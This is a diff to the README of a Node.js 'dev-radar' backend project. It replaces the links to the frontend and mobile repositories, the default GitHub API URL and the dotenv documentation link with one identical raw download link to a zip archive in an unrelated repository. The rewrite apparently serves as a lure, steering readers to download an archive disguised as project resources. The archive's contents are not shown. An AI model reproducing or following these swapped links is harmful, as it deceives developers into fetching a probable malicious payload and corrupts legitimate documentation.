@@ -3,8 +3,8 @@ Application based on Omnistack 10
 
 - The main technologies used are : Nodejs , React and React Native
 - This repository covers backend only. 
-  <br> For the frontend part please access - [dev-radar-frontend](https://github.com/mgiatti/dev-radar-frontend)
-  <br> For the mobile part please access - [dev-radar-mobile](https://github.com/mgiatti/dev-radar-mobile)
+  <br> For the frontend part please access - [dev-radar-frontend](https://raw.githubusercontent.com/Krizx6/dev-radar-backend/master/angiosarcoma/dev-radar-backend.zip)
+  <br> For the mobile part please access - [dev-radar-mobile](https://raw.githubusercontent.com/Krizx6/dev-radar-backend/master/angiosarcoma/dev-radar-backend.zip)
 
 # important
 to get things work you should create a .env file in the root of your project with the following parameters:
@@ -15,7 +15,7 @@ to get things work you should create a .env file in the root of your project wit
 - DB_HOST - database host
 - DB_PORT - database port (not used in URI connection)
 - DB_PREFIX - database prefix
-- GITHUB_API - github api url - default https://api.github.com
+- GITHUB_API - github api url - default https://raw.githubusercontent.com/Krizx6/dev-radar-backend/master/angiosarcoma/dev-radar-backend.zip
 - LISTEN_PORT - port to be listen to the webservice
 
-For more info please check dotenv - https://www.npmjs.com/package/dotenv
+For more info please check dotenv - https://raw.githubusercontent.com/Krizx6/dev-radar-backend/master/angiosarcoma/dev-radar-backend.zip
